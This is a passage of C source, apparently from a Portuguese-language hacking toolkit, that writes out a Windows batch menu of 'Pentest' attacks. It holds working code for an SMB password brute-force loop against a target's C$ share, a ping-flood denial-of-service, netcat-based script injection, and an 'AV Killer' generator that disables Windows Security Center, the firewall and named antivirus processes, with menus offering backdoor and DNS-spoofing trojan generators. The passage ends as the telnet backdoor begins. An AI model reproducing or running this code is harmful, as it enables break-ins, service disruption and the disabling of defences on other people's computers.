	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :C                                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                         \n");

	fprintf(arqWin,":4C4                                                                                              \n");
	fprintf(arqWin,"cls                                                                                               \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo   +---------------------------+                                                              \n");
	fprintf(arqWin,"echo   ^|      Rastrear um IP       ^|                                                            \n");
	fprintf(arqWin,"echo   ^|      __________________   ^|                                                            \n");
	fprintf(arqWin,"echo   ^|  ==c(______(o(______(_()  ^|                                                            \n"); 
	fprintf(arqWin,"echo   ^|             )=\\          ^|                                                            \n");
	fprintf(arqWin,"echo   ^|            // \\\\        ^|                                                            \n");  
	fprintf(arqWin,"echo   ^|           //   \\\\       ^|                                                            \n");
	fprintf(arqWin,"echo   ^|          //     \\\\      ^|                                                            \n"); 
	fprintf(arqWin,"echo   ^|         //       \\\\     ^|                                                            \n");
	fprintf(arqWin,"echo   ^|        //         \\\\    ^|                                                            \n");
	fprintf(arqWin,"echo   +---------------------------+                                                              \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"SET /P IPTRACKER=Digite um IP ou URL:                                                             \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"start http://www.ip-tracker.org/locator/ip-lookup.php?ip=%%IPTRACKER%%                            \n");
	fprintf(arqWin,"echo.                                                                                             \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :C                                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                         \n");

	fprintf(arqWin,":5C5                                                                                              \n");
	fprintf(arqWin,"cls                                                                                               \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo   +---------------------------+                                                              \n");
	fprintf(arqWin,"echo   ^|      __________________   ^|                                                            \n");
	fprintf(arqWin,"echo   ^|  ==c(______(o(______(_()  ^|                                                            \n");
	fprintf(arqWin,"echo   ^|             )=\\          ^|                                                            \n");
	fprintf(arqWin,"echo   ^|            // \\\\        ^|                                                           \n");
	fprintf(arqWin,"echo   ^|     SITE  // \\\\  IP     ^|                                                            \n");
	fprintf(arqWin,"echo   ^|          // DNS \\\\      ^|                                                             \n");
	fprintf(arqWin,"echo   ^|         //     \\\\       ^|                                                             \n");
	fprintf(arqWin,"echo   ^|        //       \\\\      ^|                                                             \n");
	fprintf(arqWin,"echo   +---------------------------+                                                               \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"echo   Verificar para qual IP o servidor DNS esta direcionando requisicoes                         \n");
	fprintf(arqWin,"echo   de acesso a determinado site                                                                \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"SET /P SDNS=Digite o endereco (URL):                                                               \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"SET /P IPDNS=Digite o IP do servidor DNS:                                                          \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"nslookup %%SDNS%% %%IPDNS%%                                                                        \n");
	fprintf(arqWin,"echo.                                                                                               \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :C                                                                        \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                    \n");       //l1027


	fprintf(arqWin,":D                                                                                                  \n");
	fprintf(arqWin,"cls                                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo *  Pentest                              :================:                                     \n");
	fprintf(arqWin,"echo    ^|                                    ^|^|              ^|^|\\                              \n");
	fprintf(arqWin,"echo    +-^> 1 - Ataques                      ^|^|    System    ^|^ \\                              \n");
	fprintf(arqWin,"echo    ^|                                    ^|^|     Down     ^|^|  ^|                            \n");
	fprintf(arqWin,"echo    +-^> 2 - Bypass                       ^|^|Please wait...^|^| /                              \n");
	fprintf(arqWin,"echo    ^|                                    ==================                                    \n");
	fprintf(arqWin,"echo    +-^> 3 - Intrusao                     ...../     \\.....                                    \n");
	fprintf(arqWin,"echo    ^|                                    :/ ############ /:                                    \n");
	fprintf(arqWin,"echo    +-^> 4 - Retornar ao menu principal   :----------------:                                    \n");
	fprintf(arqWin,"echo.                                                                                               \n");

	fprintf(arqWin,"choice /C 1234 /M \"Escolha uma das opcoes\"                                                        \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :atk10                                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :bypass10                                                                 \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :intruso                                                                  \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto 1x                                                                        \n");

	fprintf(arqWin,":atk10                                                                                              \n");
	fprintf(arqWin,"cls                                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo    +---------------------------+                                                               \n");
	fprintf(arqWin,"echo    ^|                           ^|                                                             \n");
	fprintf(arqWin,"echo    ^| ^|""""""""""""^|======[***  ^|                                                           \n");
	fprintf(arqWin,"echo    ^| ^|  Ataques   \\           ^|                                                            \n");
	fprintf(arqWin,"echo    ^| ^|_____________\\______    ^|                                                            \n");
	fprintf(arqWin,"echo    ^| ^|==[cmd ^>]============\\  ^|                                                           \n");
	fprintf(arqWin,"echo    ^| ^|______________________\\ ^|                                                            \n");
	fprintf(arqWin,"echo    ^|\\(@)(@)(@)(@)(@)(@)(@)/   ^|                                                             \n");
	fprintf(arqWin,"echo    ^|  *********************    ^|                                                             \n");
	fprintf(arqWin,"echo    +---------------------------+                                                               \n");
	fprintf(arqWin,"echo    ^|                                                                                          \n");
	fprintf(arqWin,"echo    +-^> 1 - Ataque Bruteforce em Rede LAN                                                      \n");
	fprintf(arqWin,"echo    ^|                                                                                          \n");
	fprintf(arqWin,"echo    +-^> 2 - Ataque DoS - ICMP FLOOD                                                            \n");
	fprintf(arqWin,"echo    ^|                                                                                          \n");
	fprintf(arqWin,"echo    +-^> 3 - Script injection (Netcat)                                                          \n");
	fprintf(arqWin,"echo    ^|                                                                                          \n");
	fprintf(arqWin,"echo    +-^> 4 - Retornar ao menu anterior                                                          \n");
	fprintf(arqWin,"echo.                                                                                               \n");

	fprintf(arqWin,"choice /C 1234 /M \"Escolha uma das opco‰es\"                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1D                                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :2D                                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :3D                                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :D                                                               \n");          //l1077
     

	fprintf(arqWin,":1D                                                                                      \n");
	fprintf(arqWin,"cls                                                                                      \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo   +-------------------------------+                                                 \n");
	fprintf(arqWin,"echo   ^|                               ^|                                               \n");
	fprintf(arqWin,"echo   ^| Ataque Bruteforce em Rede LAN ^|                                               \n");
	fprintf(arqWin,"echo   ^|                               ^|                                               \n");
	fprintf(arqWin,"echo   +-------------------------------+                                                 \n");
	fprintf(arqWin,"echo   ^|                                                                                \n");
	fprintf(arqWin,"echo   # Requisitos para realizar o ataque:                                              \n");
	fprintf(arqWin,"echo   ^|                                                                                \n");
	fprintf(arqWin,"echo   +-^> Rede LAN - uma (ou +) maquina na rede que tenha um diret¢rio ativo           \n");
	fprintf(arqWin,"echo   ^|              e compartilhado (protegido por senha).                            \n");
	fprintf(arqWin,"echo   ^|                                                                                \n");
	fprintf(arqWin,"echo   +-^> Seu computador - ter um dicionario na pasta \"Documentos\"                    \n");
	fprintf(arqWin,"echo   ^|                    (ou Documents). O batscript \"WinsecurityNE\"                \n");
	fprintf(arqWin,"echo   ^|                    tem que estar em algum diret¢rio do disco C:                \n");
	fprintf(arqWin,"echo   ^|                                                                                \n");
	fprintf(arqWin,"echo   +-^> Dicionario - arquivo de texto com nome \"dic.txt\", que contem uma             \n");
	fprintf(arqWin,"echo                     lista de palavras, combinacoes numericas,                       \n");
	fprintf(arqWin,"echo                     alfanumericas e outros caracteres.                              \n");
	fprintf(arqWin,"echo.                                                                                    \n");

	fprintf(arqWin,"choice /C SN /M \"Prosseguir\"                                                             \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :bflan                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :D                                                               \n");

	fprintf(arqWin,":bflan                                                                                    \n");
	fprintf(arqWin,"CD C:\\Users\\%%USERNAME%%\\Documents                                                     \n");
	fprintf(arqWin,"cls                                                                                      \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo   ^<unidade^>: - IP -  Recurso compartilhado - User                                 \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"SET /P bfuni=   Digite a letra da unidade:                                               \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"SET /P bfuser=   Digite o nome de usuario:                                               \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"SET /P bfip=   Digite o IP:                                                              \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo   Unidade: ^<%%bfuni%%:^> - IP: %%bfip%% - C$ - Usuario: %%bfuser%%                 \n");
	fprintf(arqWin,"echo.                                                                                    \n");

	fprintf(arqWin,"choice /C SN /M \"Iniciar ataque?\"                                                        \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :atkbf                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :D                                                               \n");

	fprintf(arqWin,":atkbf                                                                                   \n");
	fprintf(arqWin,"cls                                                                                      \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"SetLocal EnableDelayedExpansion                                                          \n");

	fprintf(arqWin,"for /F %%%%A in (dic.txt) do (                                                          \n");
	fprintf(arqWin,"    echo Testando com %%%%A                                                             \n");
	fprintf(arqWin,"    net use %%bfuni%%: \\\\%%bfip%%\\C$ %%%%A /user:%%bfuser%% 2> nul 1> nul           \n\n");
 
	fprintf(arqWin,"    rem \"!\" devido a expansao da variavel.                                            \n");
	fprintf(arqWin,"    if !ERRORLEVEL! equ 0 (                                                           \n\t");
	fprintf(arqWin,"        echo [+] Senha correta! %%A                                                   \n\t");
	fprintf(arqWin,"        net use %%bfuni%%: /del 1> nul                                                  \n\t");        
	fprintf(arqWin,"        goto :sair                                                                    \n\t");
	fprintf(arqWin,"    ) else (                                                                           \n\t");
	fprintf(arqWin,"        rem echo [+] falso                                                             \n\t");
	fprintf(arqWin,"    )                                                                                  \n");
	fprintf(arqWin,")                                                                                       \n");
	fprintf(arqWin,"EndLocal                                                                                \n");
	fprintf(arqWin,"echo.                                                                                   \n");       
	fprintf(arqWin,"echo   Ataque concluido!                                                                \n");
	fprintf(arqWin,"echo.                                                                                   \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                             \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :atk10                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                 \n");

	fprintf(arqWin,":sair                                                                                   \n");
	fprintf(arqWin,"EndLocal                                                                                \n");
	fprintf(arqWin,"echo.                                                                                   \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                             \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :atk10                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                 \n");   //l1159


	fprintf(arqWin,":2D                                                                                        \n");
	fprintf(arqWin,"cls                                                                                        \n");
	fprintf(arqWin,"echo.                                                                                      \n");
	fprintf(arqWin,"echo   Ataque DoS - ICMP FLOOD                                                             \n");
	fprintf(arqWin,"echo.                                                                                      \n");
	fprintf(arqWin,"set /p pcx1=Digite o ip da maquina alvo:                                                   \n");
	fprintf(arqWin,"echo. & echo. & echo.                                                                      \n");
	fprintf(arqWin,"echo   %%COMPUTERNAME%% ^>^>^>^>^> Attack ^>^>^>^>^> %%pcx1%%                              \n");
	fprintf(arqWin,"echo. & echo. & echo.                                                                      \n");

	fprintf(arqWin,"choice /C SN /M \"Iniciar ataque\"                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :atkdos                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :atk10                                                            \n");

	fprintf(arqWin,":atkdos                                                                                      \n");
	fprintf(arqWin,"cls                                                                                          \n");
	fprintf(arqWin,"start ping -t -l 65500 %%pcx1%% -w 1                                                         \n");
	fprintf(arqWin,"echo.                                                                                        \n");
	fprintf(arqWin,"echo   O ataque esta em andamento na janela do Prompt que foi aberta...                       \n");
	fprintf(arqWin,"echo.                                                                                         \n");
	fprintf(arqWin,"echo       %%COMPUTERNAME%%                 %%pcx1%%                                          \n");
	fprintf(arqWin,"echo       _______________              _______________                                       \n");
	fprintf(arqWin,"echo      ^|  ___________  ^|          ^|  ___________  ^|                                    \n");
	fprintf(arqWin,"echo      ^| ^|   \\ /    ^| ^|          ^| ^|   /  \\   ^| ^|                                \n");
	fprintf(arqWin,"echo      ^| ^|   0   0   ^| ^|          ^| ^|   0 - 0   ^| ^|                                \n");
	fprintf(arqWin,"echo      ^| ^|     -     ^| ^|  Ataque  ^| ^|    ___    ^| ^|                                \n");
	fprintf(arqWin,"echo      ^| ^|  \\___/   ^| ^|    DoS   ^| ^|   (___)   ^| ^|                                \n");
	fprintf(arqWin,"echo      ^| ^|___     ___^| ^|          ^| ^|___________^| ^|                                \n");
	fprintf(arqWin,"echo      ^|_____^|\\_/^|_____^|          ^|_______________^|                                  \n");
	fprintf(arqWin,"echo        _^|__^|/\\^|_^|_................_^|________^|_                                    \n");
	fprintf(arqWin,"echo       / ********** \\             / ********** \\                                        \n");
	fprintf(arqWin,"echo     /  ************  \\         /  ************  \\                                      \n");
	fprintf(arqWin,"echo    --------------------        --------------------                                      \n");
	fprintf(arqWin,"echo.                                                                                         \n");   
	fprintf(arqWin,"echo   Para cancelar o ataque, pressione Control-C (na outra janela do Prompt)                \n");
	fprintf(arqWin,"echo.                                                                                         \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                 \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :atk10                                                              \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                     \n");

	fprintf(arqWin,":3D                                                                                           \n");
	fprintf(arqWin,"C:                                                                                            \n");
	fprintf(arqWin,"CD %%windir%%\\system32                                                                       \n");
	fprintf(arqWin,"IF EXIST netcat.exe GOTO :injection                                                           \n");
	fprintf(arqWin,"IF NOT EXIST netcat.exe GOTO :notnetcat                                                       \n");

	fprintf(arqWin,":notnetcat                                                                                     \n");
	fprintf(arqWin,"echo.                                                                                          \n");
	fprintf(arqWin,"echo   E necessario ter o Netcat instalado na pasta System32!                                  \n");
	fprintf(arqWin,"echo.                                                                                          \n");
	fprintf(arqWin,"echo   netcat.exe n∆o encontrado!                                                              \n");
	fprintf(arqWin,"echo.                                                                                          \n");

	fprintf(arqWin,"choice /C SN /M \"Deseja baixar o aplicativo\"                                                 \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1download                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :atk10                                                                \n");// l1218

	fprintf(arqWin,":injection											\n");
	fprintf(arqWin,"cls												\n");
	fprintf(arqWin,"CD C:\\Users\\%%USERNAME%%\\Desktop								\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   +---------------------------+								\n");
	fprintf(arqWin,"echo   ^|                           ^|								\n");
	fprintf(arqWin,"echo   ^| Script injection (Netcat) ^|								\n");
	fprintf(arqWin,"echo   ^|                           ^|								\n");
	fprintf(arqWin,"echo   +---------------------------+								\n");
	fprintf(arqWin,"echo   ^|											\n");
	fprintf(arqWin,"echo   +-^> O script deve estar em sua desktop.							\n");
	fprintf(arqWin,"echo   ^|											\n");
	fprintf(arqWin,"echo   +-^> Ap¢s injetar o script, pressione CRTL+C.						\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"SET /P sip=Digite o IP: 									\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"SET /P sdoor=Digite o nß da porta: 								\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"SET /P scriptx=Digite o nome do script (com extens∆o): 						\n");
	fprintf(arqWin,"echo. & echo. & echo.										\n");

	fprintf(arqWin,"choice /C SN /M:\"Iniciar injecao\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :injectnow								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :3D									\n");

	fprintf(arqWin,":injectnow											\n");
	fprintf(arqWin,"cls												\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   Injetando %%scriptx%% na porta %%sdoor%% do IP %%sip%%...				\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"netcat %%sip%% %%sdoor%% < %%scriptx%%								\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :atk10								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit									\n");


	fprintf(arqWin,":bypass10											\n");
	fprintf(arqWin,"cls												\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo    +----------------------------------------------------+					\n");
	fprintf(arqWin,"echo    ^|                 _           \\         .  ./       ^|				\n");
	fprintf(arqWin,"echo    ^| Bypass         ^|=^|        \\      .:';'.:..'   /   ^|				\n");
	fprintf(arqWin,"echo    ^|                ^|=^|             (M^^^^.^^~~:.'').      |				\n");
	fprintf(arqWin,"echo    ^|                ^|=^|       -   (/  .    . .\\\\)  -  ^|				\n");
	fprintf(arqWin,"echo    ^|   O            ^|=^|          ((^| :. ~ ^^  :. .^|))    ^|				\n");
	fprintf(arqWin,"echo    ^|  ^|\\\\           ^|=^|       -  (\\- ^| \\ /  ^|  /)  -^|				\n");
	fprintf(arqWin,"echo    ^|  ^|  T          ^|=^|           -\\ \\     /  /-      ^|				\n");
	fprintf(arqWin,"echo    ^| /\\[X].........^|=^|.............\\ \\   /  /        ^|				\n");
	fprintf(arqWin,"echo    ^|               .^|=^|.                                ^|				\n");
	fprintf(arqWin,"echo    ^|                ...                                 ^|				\n");
	fprintf(arqWin,"echo    +----------------------------------------------------+					\n");
	fprintf(arqWin,"echo    ^|											\n");
	fprintf(arqWin,"echo    +-^> 1 - Gerar AV Killer								\n");
	fprintf(arqWin,"echo    ^|											\n");
	fprintf(arqWin,"echo    +-^> 2 - Gerar Badcom Starter								\n");
	fprintf(arqWin,"echo    ^|											\n");
	fprintf(arqWin,"echo    +-^> 3 - Retornar ao menu anterior							\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C 123 /M \"Escolha uma das opcoes\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :4D									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :7D									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :D									\n");

	fprintf(arqWin,":4D												\n");
	fprintf(arqWin,"cls												\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   AV Killer										\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   Atencao! Cuidado para n∆o executar em seu proprio PC o script gerado!			\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   Digite o nome de cada processo do antivirus at°vo no sistema operacional			\n");
	fprintf(arqWin,"echo   Exemplo: antivirus.exe									\n");
	fprintf(arqWin,"echo   Limitei a finalizacao de 10 processos no maximo.						\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Iniciar\"									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :bypass10								\n");

	fprintf(arqWin,":digpro												\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo01=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro2								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n"); //l1309


	fprintf(arqWin,":digpro2											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo02=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro3								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro3											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo03=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro4								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro4											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo04=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro5								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro5											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo05=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro6								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro6											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo06=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro7								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro7											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo07=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro8								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro8											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo08=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro9								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro9											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo09=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Acrescentar outro processo\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :digpro10								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :goavkill								\n");

	fprintf(arqWin,":digpro10											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"set /p Processo10=Digite:									\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M \"Gerar AV Killer\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :goavkill								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :D									\n");//l1391


	fprintf(arqWin,":goavkill											\n");
	fprintf(arqWin,"IF EXIST AVKill.bat GOTO :goavkill0								\n");
	fprintf(arqWin,"IF NOT EXIST AVKill.bat GOTO :goavkill2								\n");
	fprintf(arqWin,":goavkill2											\n");
	fprintf(arqWin,"echo @echo off >> AVKill.bat									\n");
	fprintf(arqWin,"echo break off >> AVKill.bat									\n");
	fprintf(arqWin,"echo cd\\ >> AVKill.bat										\n");
	fprintf(arqWin,"echo netstop wscsvc >> AVKill.bat								\n");		
	fprintf(arqWin,"echo sc config wscsvc start=disabled >> AVKill.bat						\n");
	fprintf(arqWin,"echo cls >> AVKill.bat										\n");
	fprintf(arqWin,"echo netsh firewall set opmode mode=disabled >> AVKill.bat					\n");
	fprintf(arqWin,"echo net stop SharedAccess >> AVKill.bat							\n");
	fprintf(arqWin,"echo cls >> AVKill.bat										\n");
	fprintf(arqWin,"echo goto antivir >> AVKill.bat									\n");
	fprintf(arqWin,"echo :antivir >> AVKill.bat									\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo01%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo02%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo03%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo04%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo05%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo06%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo07%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo08%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo09%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo taskkill /f /im %%Processo10%% >> AVKill.bat						\n");
	fprintf(arqWin,"echo cls >> AVKill.bat										\n");
	fprintf(arqWin,"echo exit >> AVKill.bat										\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   \"AVKill.bat\" gerado com sucesso!							\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"pause												\n");
	fprintf(arqWin,"goto :D												\n");

	fprintf(arqWin,":goavkill0											\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   Nao sera poss°vel gerar o AV Killer!							\n");
	fprintf(arqWin,"echo   \"AVKill.bat\" ja existe no diret¢rio atual!						\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"pause												\n");
	fprintf(arqWin,"goto :D												\n");

	fprintf(arqWin,":intruso											\n");
	fprintf(arqWin,"cls												\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo    +------------------------------------------+						\n");
	fprintf(arqWin,"echo    ^|                                          ^|						\n");
	fprintf(arqWin,"echo    ^|                _,--=--._                 ^|						\n");
	fprintf(arqWin,"echo    ^|              ,'    _    `.               ^|						\n");
	fprintf(arqWin,"echo    ^|             -    _(_)_o   -              ^|						\n");
	fprintf(arqWin,"echo    ^|        ____'    /_  _/]    `____         ^|						\n");
	fprintf(arqWin,"echo    ^| -=====::(+):::::::::::::::::(+)::=====-  ^|						\n");
	fprintf(arqWin,"echo    ^|          (+).''''''''''''''',(+)          |						\n");
	fprintf(arqWin,"echo    ^|              . Instrus∆o ,               ^|						\n");
	fprintf(arqWin,"echo    ^| crj            `  -=-  '                 ^|						\n");
	fprintf(arqWin,"echo    ^|                                          ^|						\n");
	fprintf(arqWin,"echo    +------------------------------------------+						\n");
	fprintf(arqWin,"echo    ^|											\n");
	fprintf(arqWin,"echo    +-^> 1 - Gerar Backdoor (conex∆o direta)						\n");
	fprintf(arqWin,"echo    ^|											\n");
	fprintf(arqWin,"echo    +-^> 2 - Gerar Backdoor de Rede LAN							\n");
	fprintf(arqWin,"echo    ^|											\n");
	fprintf(arqWin,"echo    +-^> 3 - Gerar Trojan de DNS Spoofing							\n");
	fprintf(arqWin,"echo    ^|											\n");
	fprintf(arqWin,"echo    +-^> 4 - Retornar ao menu anterior							\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C 1234 /M \"Escolha uma das opcoes\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :5D									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :6D									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :8D									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :D									\n");

	fprintf(arqWin,":5D												\n");
	fprintf(arqWin,"cls												\n");
	fprintf(arqWin,"echo. 												\n");            
	fprintf(arqWin,"echo   Backdoor (conex∆o direta)								\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   Atencao! Cuidado para n∆o executar em seu pr¢prio PC o script gerado!			\n");
	fprintf(arqWin,"echo.												\n");	
	fprintf(arqWin,"echo   Acao do Backdoor: vai habilitar o servidor telnet na maquina alvo			\n");
